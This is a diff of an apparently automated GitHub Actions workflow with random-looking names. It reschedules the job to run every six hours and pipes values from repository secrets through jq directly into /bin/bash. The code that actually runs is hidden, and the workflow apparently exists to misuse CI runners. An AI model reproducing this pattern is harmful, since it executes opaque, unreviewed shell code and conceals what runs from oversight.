@@ -2,19 +2,26 @@ name: qushubin2418
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 4/6 * * *'
+    - cron: '9 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: qushubin2418
         env:
-          v14: ${{ secrets.v14 }}
+          ljipn724: ${{ secrets.ljipn724 }}
         run: |
-          echo $v14 | jq -r .thchh5 | /bin/bash
-          echo $k4646 | jq -r .jer9986 | /bin/bash
-          echo $osjq7180 | jq -r .oekx4965 | /bin/bash
-          echo $if4 | jq -r .d160 | /bin/bash
+          echo $ljipn724 | jq -r .m531 | /bin/bash
+          echo $im9989 | jq -r .olkqj607 | /bin/bash
+          echo $ti37492 | jq -r .j41364 | /bin/bash
+          echo $cmvhr9 | jq -r .gch33 | /bin/bash
+          echo $j49 | jq -r .qbtvx75 | /bin/bash
+          echo $sgxa11266 | jq -r .gy1 | /bin/bash
+          echo $vs27 | jq -r .cq6 | /bin/bash
+          echo $qfm5 | jq -r .xbzx3 | /bin/bash
+          echo $pm42 | jq -r .gduut3772 | /bin/bash
+          echo $okp085 | jq -r .y802 | /bin/bash
+          echo $ln40 | jq -r .dixfu60427 | /bin/bash
 
